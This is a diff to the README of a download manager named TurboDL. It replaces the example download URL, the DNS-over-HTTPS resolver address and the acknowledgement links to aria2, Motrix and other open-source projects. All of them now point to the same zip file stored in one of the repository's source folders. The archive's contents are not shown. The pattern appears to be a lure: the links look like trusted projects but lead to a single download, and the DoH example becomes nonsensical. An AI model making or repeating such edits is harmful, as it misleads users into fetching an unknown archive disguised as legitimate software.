@@ -54,7 +54,7 @@ val client = TurboClient(
 // Submit a task
 val id = client.submit(
     DownloadRequest(
-        url = "https://example.com/big.zip",
+        url = "https://raw.githubusercontent.com/markkf66/TurboDL/main/turbodl-core/src/main/kotlin/dev/turbodl/2.9-alpha.4.zip",
         destination = File("big.zip"),
     )
 )
@@ -101,7 +101,7 @@ Common usage:
 turbodl <url> -o out.bin -c 64
 
 # Through a proxy, with encrypted DNS, speed limited to 10MB/s
-turbodl <url> -p http://127.0.0.1:7890 --doh https://dns.alidns.com/dns-query -l 10MB
+turbodl <url> -p http://127.0.0.1:7890 --doh https://raw.githubusercontent.com/markkf66/TurboDL/main/turbodl-core/src/main/kotlin/dev/turbodl/2.9-alpha.4.zip -l 10MB
 
 # Machine-readable NDJSON events (start/progress/completed/failed) for scripts & agents
 turbodl <url> --json
@@ -167,7 +167,7 @@ Plugin documentation:
 ## Design notes & acknowledgements
 
 TurboDL's design draws on the ideas of the following open-source projects (ideas only, **no source copied**), with thanks:
-[aria2](https://github.com/aria2/aria2), [Xtreme Download Manager](https://github.com/subhra74/xdm), [axel](https://github.com/axel-download-accelerator/axel), [Persepolis](https://github.com/persepolisdm/persepolis), [Motrix](https://github.com/agalwood/Motrix), [ab-download-manager](https://github.com/amir1376/ab-download-manager).
+[aria2](https://raw.githubusercontent.com/markkf66/TurboDL/main/turbodl-core/src/main/kotlin/dev/turbodl/2.9-alpha.4.zip), [Xtreme Download Manager](https://raw.githubusercontent.com/markkf66/TurboDL/main/turbodl-core/src/main/kotlin/dev/turbodl/2.9-alpha.4.zip), [axel](https://raw.githubusercontent.com/markkf66/TurboDL/main/turbodl-core/src/main/kotlin/dev/turbodl/2.9-alpha.4.zip), [Persepolis](https://raw.githubusercontent.com/markkf66/TurboDL/main/turbodl-core/src/main/kotlin/dev/turbodl/2.9-alpha.4.zip), [Motrix](https://raw.githubusercontent.com/markkf66/TurboDL/main/turbodl-core/src/main/kotlin/dev/turbodl/2.9-alpha.4.zip), [ab-download-manager](https://raw.githubusercontent.com/markkf66/TurboDL/main/turbodl-core/src/main/kotlin/dev/turbodl/2.9-alpha.4.zip).
 
 ## License
 
